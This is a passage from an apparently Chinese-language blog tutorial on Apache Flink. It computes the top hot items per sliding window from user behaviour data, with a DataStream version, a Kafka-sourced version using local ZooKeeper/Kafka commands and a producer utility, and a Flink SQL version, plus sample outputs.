class="keyword">public</span> Long <span class="title">add</span><span class="params">(UserBehavior value, Long accumulator)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> accumulator + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Long <span class="title">getResult</span><span class="params">(Long accumulator)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> accumulator;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Long <span class="title">merge</span><span class="params">(Long a, Long b)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> a + b;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 自定义全窗口函数</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">WindowItemCountResult</span> <span class="keyword">implements</span> <span class="title">WindowFunction</span>&lt;<span class="title">Long</span>, <span class="title">ItemViewCount</span>, <span class="title">Long</span>, <span class="title">TimeWindow</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">apply</span><span class="params">(Long itemId, TimeWindow window, Iterable&lt;Long&gt; input, Collector&lt;ItemViewCount&gt; out)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      Long windowEnd = window.getEnd();</span><br><span class="line">      Long count = input.iterator().next();</span><br><span class="line">      out.collect(<span class="keyword">new</span> ItemViewCount(itemId, windowEnd, count));</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 实现自定义KeyedProcessFunction</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">TopNHotItems</span> <span class="keyword">extends</span> <span class="title">KeyedProcessFunction</span>&lt;<span class="title">Long</span>, <span class="title">ItemViewCount</span>, <span class="title">String</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 定义属性， TopN的大小</span></span><br><span class="line">    <span class="keyword">private</span> Integer topSize;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 定义状态列表，保存当前窗口内所有输出的ItemViewCount</span></span><br><span class="line">    ListState&lt;ItemViewCount&gt; itemViewCountListState;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">open</span><span class="params">(Configuration parameters)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      itemViewCountListState = getRuntimeContext().getListState(</span><br><span class="line">        <span class="keyword">new</span> ListStateDescriptor&lt;ItemViewCount&gt;(<span class="string">&quot;item-view-count-list&quot;</span>, ItemViewCount.class));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//        @Override</span></span><br><span class="line">    <span class="comment">//        public void close() throws Exception &#123;</span></span><br><span class="line">    <span class="comment">//            itemViewCountListState.clear();</span></span><br><span class="line">    <span class="comment">//        &#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">TopNHotItems</span><span class="params">(Integer topSize)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">this</span>.topSize = topSize;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">processElement</span><span class="params">(ItemViewCount value, Context ctx, Collector&lt;String&gt; out)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      <span class="comment">// 每来一条数据，存入List中，并注册定时器</span></span><br><span class="line">      itemViewCountListState.add(value);</span><br><span class="line">      <span class="comment">// 模拟等待，所以这里时间设的比较短(1ms)</span></span><br><span class="line">      ctx.timerService().registerEventTimeTimer(value.getWindowEnd() + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onTimer</span><span class="params">(<span class="keyword">long</span> timestamp, OnTimerContext ctx, Collector&lt;String&gt; out)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      <span class="comment">// 定时器触发，当前已收集到所有数据，排序输出</span></span><br><span class="line">      ArrayList&lt;ItemViewCount&gt; itemViewCounts = Lists.newArrayList(itemViewCountListState.get().iterator());</span><br><span class="line">      <span class="comment">// 从多到少(越热门越前面)</span></span><br><span class="line">      itemViewCounts.sort((a, b) -&gt; -Long.compare(a.getCount(), b.getCount()));</span><br><span class="line">      StringBuilder resultBuilder = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">      resultBuilder.append(<span class="string">&quot;============================&quot;</span>).append(System.lineSeparator());</span><br><span class="line">      resultBuilder.append(<span class="string">&quot;窗口结束时间：&quot;</span>).append(<span class="keyword">new</span> Timestamp(timestamp - <span class="number">1</span>)).append(System.lineSeparator());</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 遍历列表，取top n输出</span></span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; Math.min(topSize, itemViewCounts.size()); i++) &#123;</span><br><span class="line">        ItemViewCount currentItemViewCount = itemViewCounts.get(i);</span><br><span class="line">        resultBuilder.append(<span class="string">&quot;NO &quot;</span>).append(i + <span class="number">1</span>).append(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">          .append(<span class="string">&quot; 商品ID = &quot;</span>).append(currentItemViewCount.getItemId())</span><br><span class="line">          .append(<span class="string">&quot; 热门度 = &quot;</span>).append(currentItemViewCount.getCount())</span><br><span class="line">          .append(System.lineSeparator());</span><br><span class="line">      &#125;</span><br><span class="line">      resultBuilder.append(<span class="string">&quot;===============================&quot;</span>).append(System.lineSeparator());</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 控制输出频率</span></span><br><span class="line">      Thread.sleep(<span class="number">1000L</span>);</span><br><span class="line"></span><br><span class="line">      out.collect(resultBuilder.toString());</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p> 输入文件如下：  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">543462,1715,1464116,pv,1511658000</span><br><span class="line">662867,2244074,1575622,pv,1511658000</span><br><span class="line">561558,3611281,965809,pv,1511658000</span><br><span class="line">894923,3076029,1879194,pv,1511658000</span><br><span class="line">834377,4541270,3738615,pv,1511658000</span><br><span class="line">...</span><br></pre></td></tr></table></figure></li><li><p> 输出如下：  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">============================</span><br><span class="line">窗口结束时间：2017-11-26 10:10:00.0</span><br><span class="line">NO 1: 商品ID = 2338453 热门度 = 30</span><br><span class="line">NO 2: 商品ID = 812879 热门度 = 18</span><br><span class="line">NO 3: 商品ID = 2563440 热门度 = 14</span><br><span class="line">NO 4: 商品ID = 138964 热门度 = 12</span><br><span class="line">NO 5: 商品ID = 3244134 热门度 = 12</span><br><span class="line">===============================</span><br><span class="line"></span><br><span class="line">============================</span><br><span class="line">窗口结束时间：2017-11-26 10:15:00.0</span><br><span class="line">NO 1: 商品ID = 2338453 热门度 = 33</span><br><span class="line">NO 2: 商品ID = 812879 热门度 = 18</span><br><span class="line">NO 3: 商品ID = 3244134 热门度 = 13</span><br><span class="line">NO 4: 商品ID = 2563440 热门度 = 13</span><br><span class="line">NO 5: 商品ID = 2364679 热门度 = 13</span><br><span class="line">===============================</span><br><span class="line"></span><br><span class="line">============================</span><br><span class="line">窗口结束时间：2017-11-26 10:20:00.0</span><br><span class="line">NO 1: 商品ID = 2338453 热门度 = 32</span><br><span class="line">NO 2: 商品ID = 812879 热门度 = 18</span><br><span class="line">NO 3: 商品ID = 3244134 热门度 = 15</span><br><span class="line">NO 4: 商品ID = 4649427 热门度 = 13</span><br><span class="line">NO 5: 商品ID = 2364679 热门度 = 12</span><br><span class="line">===============================</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure></li></ul><h6 id="代码2-kafka"><a href="#代码2-kafka" class="headerlink" title="代码2-kafka"></a>代码2-kafka</h6><ul><li><p> java代码  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 仅修改 获取数据源的部分</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 从csv文件中获取数据</span></span><br><span class="line"><span class="comment">//        DataStream&lt;String&gt; inputStream = env.readTextFile(&quot;/tmp/UserBehaviorAnalysis/HotItemsAnalysis/src/main/resources/UserBehavior.csv&quot;);</span></span><br><span class="line"></span><br><span class="line">Properties properties = <span class="keyword">new</span> Properties();</span><br><span class="line">properties.setProperty(<span class="string">&quot;bootstrap.servers&quot;</span>, <span class="string">&quot;localhost:9092&quot;</span>);</span><br><span class="line">properties.setProperty(<span class="string">&quot;group.id&quot;</span>, <span class="string">&quot;consumer&quot;</span>);</span><br><span class="line"><span class="comment">// 下面是一些次要参数</span></span><br><span class="line">properties.setProperty(<span class="string">&quot;key.deserializer&quot;</span>, <span class="string">&quot;org.apache.kafka.common.serialization.StringDeserializer&quot;</span>);</span><br><span class="line">properties.setProperty(<span class="string">&quot;value.deserializer&quot;</span>, <span class="string">&quot;org.apache.kafka.common.serialization.StringDeserializer&quot;</span>);</span><br><span class="line">properties.setProperty(<span class="string">&quot;auto.offset.reset&quot;</span>, <span class="string">&quot;latest&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 从kafka消费数据</span></span><br><span class="line">DataStream&lt;String&gt; inputStream = env.addSource(<span class="keyword">new</span> FlinkKafkaConsumer&lt;&gt;(<span class="string">&quot;hotitems&quot;</span>, <span class="keyword">new</span> SimpleStringSchema(), properties ));</span><br></pre></td></tr></table></figure></li><li><p> 启动本地kafka里自带的zookeeper  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> bin/zookeeper-server-start.sh config/zookeeper.properties</span></span><br></pre></td></tr></table></figure></li><li><p> 启动kafka  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> bin/kafka-server-start.sh config/server.properties</span></span><br></pre></td></tr></table></figure></li><li><p> 启动kafka生产者console  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> bin/kafka-console-producer.sh --broker-list localhost:9092  --topic hotitems</span></span><br></pre></td></tr></table></figure></li><li><p> 运行Flink程序，输入数据（kafka-console-producer）  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> bin/kafka-console-producer.sh --broker-list localhost:9092  --topic hotitems</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">543462,1715,1464116,pv,1511658000</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">662867,2244074,1575622,pv,1511658060</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">561558,3611281,965809,pv,1511658120</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">894923,1715,1879194,pv,1511658180</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">834377,2244074,3738615,pv,1511658240</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">625915,3611281,570735,pv,1511658300</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">625915,3611281,570735,pv,1511658301</span></span><br></pre></td></tr></table></figure></li><li><p> 输出  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">============================</span><br><span class="line">窗口结束时间：2017-11-26 09:05:00.0</span><br><span class="line">NO 1: 商品ID = 1715 热门度 = 2</span><br><span class="line">NO 2: 商品ID = 2244074 热门度 = 2</span><br><span class="line">NO 3: 商品ID = 3611281 热门度 = 1</span><br><span class="line">===============================</span><br></pre></td></tr></table></figure></li></ul><h6 id="代码3-kafka批量数据测试"><a href="#代码3-kafka批量数据测试" class="headerlink" title="代码3-kafka批量数据测试"></a>代码3-kafka批量数据测试</h6><ul><li><p> java代码  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.kafka.clients.producer.KafkaProducer;</span><br><span class="line"><span class="keyword">import</span> org.apache.kafka.clients.producer.ProducerRecord;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.BufferedWriter;</span><br><span class="line"><span class="keyword">import</span> java.io.FileReader;</span><br><span class="line"><span class="keyword">import</span> java.util.Properties;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> : Ashiamd email: ashiamd@foxmail.com</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> : 2021/2/4 11:53 PM</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">KafkaProducerUtil</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    writeToKafka(<span class="string">&quot;hotitems&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">writeToKafka</span><span class="params">(String topic)</span><span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">    <span class="comment">// Kafka配置</span></span><br><span class="line">    Properties properties = <span class="keyword">new</span> Properties();</span><br><span class="line">    properties.setProperty(<span class="string">&quot;bootstrap.servers&quot;</span>, <span class="string">&quot;localhost:9092&quot;</span>);</span><br><span class="line">    properties.setProperty(<span class="string">&quot;key.serializer&quot;</span>, <span class="string">&quot;org.apache.kafka.common.serialization.StringSerializer&quot;</span>);</span><br><span class="line">    properties.setProperty(<span class="string">&quot;value.serializer&quot;</span>, <span class="string">&quot;org.apache.kafka.common.serialization.StringSerializer&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 定义一个Kafka Producer</span></span><br><span class="line">    KafkaProducer&lt;String, String&gt; kafkaProducer = <span class="keyword">new</span> KafkaProducer&lt;String, String&gt;(properties);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 用缓冲方式来读取文本</span></span><br><span class="line">    BufferedReader bufferedReader = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> FileReader(<span class="string">&quot;/tmp/UserBehaviorAnalysis/HotItemsAnalysis/src/main/resources/UserBehavior.csv&quot;</span>));</span><br><span class="line">    String line;</span><br><span class="line">    <span class="keyword">while</span>((line = bufferedReader.readLine())!=<span class="keyword">null</span>)&#123;</span><br><span class="line">      ProducerRecord&lt;String,String&gt; producerRecord = <span class="keyword">new</span> ProducerRecord&lt;&gt;(topic,line );</span><br><span class="line">      <span class="comment">// 用producer发送数据</span></span><br><span class="line">      kafkaProducer.send(producerRecord);</span><br><span class="line">    &#125;</span><br><span class="line">    kafkaProducer.close();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p> 启动zookeeper </p></li><li><p> 启动kafka服务 </p></li><li><p> 运行该java程序，之后就可以直接启动HotItems程序，读取本地已有的kafka数据了 </p></li></ul><h6 id="代码4-Flink-SQL实现"><a href="#代码4-Flink-SQL实现" class="headerlink" title="代码4-Flink-SQL实现"></a>代码4-Flink-SQL实现</h6><ul><li> java代码</li></ul><p><strong>下面用最新的Expression写法实现&lt;=新版本推荐的写法</strong>  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> beans.UserBehavior;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.DataStream;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.environment.StreamExecutionEnvironment;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.functions.timestamps.BoundedOutOfOrdernessTimestampExtractor;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.windowing.time.Time;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.runtime.operators.util.AssignerWithPeriodicWatermarksAdapter;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.table.api.EnvironmentSettings;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.table.api.Slide;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.table.api.Table;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.table.api.bridge.java.StreamTableEnvironment;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.types.Row;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.TimeUnit;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> org.apache.flink.table.api.Expressions.$;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> org.apache.flink.table.api.Expressions.lit;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> : Ashiamd email: ashiamd@foxmail.com</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> : 2021/2/5 12:18 AM</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HotItemsWithSql</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">// 1. 创建执行环境</span></span><br><span class="line">    StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">    env.setParallelism(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. 从csv文件中获取数据</span></span><br><span class="line">    DataStream&lt;String&gt; inputStream = env.readTextFile(<span class="string">&quot;/tmp/UserBehaviorAnalysis/HotItemsAnalysis/src/main/resources/UserBehavior.csv&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. 转换成POJO,分配时间戳和watermark</span></span><br><span class="line">    DataStream&lt;UserBehavior&gt; userBehaviorDataStream = inputStream.map(line -&gt; &#123;</span><br><span class="line">      String[] fields = line.split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> UserBehavior(<span class="keyword">new</span> Long(fields[<span class="number">0</span>]), <span class="keyword">new</span> Long(fields[<span class="number">1</span>]), <span class="keyword">new</span> Integer(fields[<span class="number">2</span>]), fields[<span class="number">3</span>], <span class="keyword">new</span> Long(fields[<span class="number">4</span>]));</span><br><span class="line">    &#125;).assignTimestampsAndWatermarks(<span class="keyword">new</span> AssignerWithPeriodicWatermarksAdapter.Strategy&lt;&gt;(</span><br><span class="line">      <span class="keyword">new</span> BoundedOutOfOrdernessTimestampExtractor&lt;UserBehavior&gt;(Time.of(<span class="number">200</span>, TimeUnit.MILLISECONDS)) &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">long</span> <span class="title">extractTimestamp</span><span class="params">(UserBehavior element)</span> </span>&#123;</span><br><span class="line">          <span class="keyword">return</span> element.getTimestamp() * <span class="number">1000L</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    ));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4. 创建表执行环境,使用blink版本</span></span><br><span class="line">    EnvironmentSettings settings = EnvironmentSettings.newInstance()</span><br><span class="line">      .useBlinkPlanner()</span><br><span class="line">      .inStreamingMode()</span><br><span class="line">      .build();</span><br><span class="line">    StreamTableEnvironment tableEnv = StreamTableEnvironment.create(env, settings);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 5. 将流转换成表</span></span><br><span class="line">    Table dataTable = tableEnv.fromDataStream(userBehaviorDataStream,</span><br><span class="line">                                              $(<span class="string">&quot;itemId&quot;</span>),</span><br><span class="line">                                              $(<span class="string">&quot;behavior&quot;</span>),</span><br><span class="line">                                              $(<span class="string">&quot;timestamp&quot;</span>).rowtime().as(<span class="string">&quot;ts&quot;</span>)</span><br><span class="line">                                             );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 6. 分组开窗</span></span><br><span class="line">    <span class="comment">// Table API</span></span><br><span class="line">    Table windowAggTable = dataTable</span><br><span class="line">      .filter($(<span class="string">&quot;behavior&quot;</span>).isEqual(<span class="string">&quot;pv&quot;</span>))</span><br><span class="line">      .window(Slide.over(lit(<span class="number">1</span>).hours()).every(lit(<span class="number">5</span>).minutes()).on($(<span class="string">&quot;ts&quot;</span>)).as(<span class="string">&quot;w&quot;</span>))</span><br><span class="line">      .groupBy($(<span class="string">&quot;itemId&quot;</span>), $(<span class="string">&quot;w&quot;</span>))</span><br><span class="line">      .select($(<span class="string">&quot;itemId&quot;</span>), $(<span class="string">&quot;w&quot;</span>).end().as(<span class="string">&quot;windowEnd&quot;</span>), $(<span class="string">&quot;itemId&quot;</span>).count().as(<span class="string">&quot;cnt&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 7. 利用开创函数，对count值进行排序，并获取Row number，得到Top N</span></span><br><span class="line">    <span class="comment">// SQL</span></span><br><span class="line">    DataStream&lt;Row&gt; aggStream = tableEnv.toAppendStream(windowAggTable, Row.class);</span><br><span class="line">    tableEnv.createTemporaryView(<span class="string">&quot;agg&quot;</span>, aggStream, $(<span class="string">&quot;itemId&quot;</span>), $(<span class="string">&quot;windowEnd&quot;</span>), $(<span class="string">&quot;cnt&quot;</span>));</span><br><span class="line"></span><br><span class="line">    Table resultTable = tableEnv.sqlQuery(<span class="string">&quot;select * from &quot;</span> +</span><br><span class="line">                                          <span class="string">&quot;  ( select *, ROW_NUMBER() over (partition by windowEnd order by cnt desc) as row_num &quot;</span> +</span><br><span class="line">                                          <span class="string">&quot;  from agg) &quot;</span> +</span><br><span class="line">                                          <span class="string">&quot; where row_num &lt;= 5 &quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 纯SQL实现</span></span><br><span class="line">    tableEnv.createTemporaryView(<span class="string">&quot;data_table&quot;</span>, userBehaviorDataStream, $(<span class="string">&quot;itemId&quot;</span>), $(<span class="string">&quot;behavior&quot;</span>), $(<span class="string">&quot;timestamp&quot;</span>).rowtime().as(<span class="string">&quot;ts&quot;</span>));</span><br><span class="line">    Table resultSqlTable = tableEnv.sqlQuery(<span class="string">&quot;select * from &quot;</span> +</span><br><span class="line">                                             <span class="string">&quot;  ( select *, ROW_NUMBER() over (partition by windowEnd order by cnt desc) as row_num &quot;</span> +</span><br><span class="line">                                             <span class="string">&quot;  from ( &quot;</span> +</span><br><span class="line">                                             <span class="string">&quot;    select itemId, count(itemId) as cnt, HOP_END(ts, interval &#x27;5&#x27; minute, interval &#x27;1&#x27; hour) as windowEnd &quot;</span> +</span><br><span class="line">                                             <span class="string">&quot;    from data_table &quot;</span> +</span><br><span class="line">                                             <span class="string">&quot;    where behavior = &#x27;pv&#x27; &quot;</span> +</span><br><span class="line">                                             <span class="string">&quot;    group by itemId, HOP(ts, interval &#x27;5&#x27; minute, interval &#x27;1&#x27; hour)&quot;</span> +</span><br><span class="line">                                             <span class="string">&quot;    )&quot;</span> +</span><br><span class="line">                                             <span class="string">&quot;  ) &quot;</span> +</span><br><span class="line">                                             <span class="string">&quot; where row_num &lt;= 5 &quot;</span>);</span><br><span class="line"></span><br><span class="line"> <span class="comment">//   tableEnv.toRetractStream(resultTable, Row.class).print();</span></span><br><span class="line">    tableEnv.toRetractStream(resultSqlTable, Row.class).print();</span><br><span class="line"></span><br><span class="line">    env.execute(<span class="string">&quot;hot items with sql job&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li> 输出  <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">....</span><br><span class="line">(true,2288408,2017-11-26T03:00,15,4)</span><br><span class="line">(false,279675,2017-11-26T03:00,14,5)</span><br><span class="line">(true,291932,2017-11-26T03:00,15,5)</span><br><span class="line">(false,3715112,6,2017-11-26T03:05,1)</span><br><span class="line">(true,3244931,7,2017-11-26T03:05,1)</span><br><span 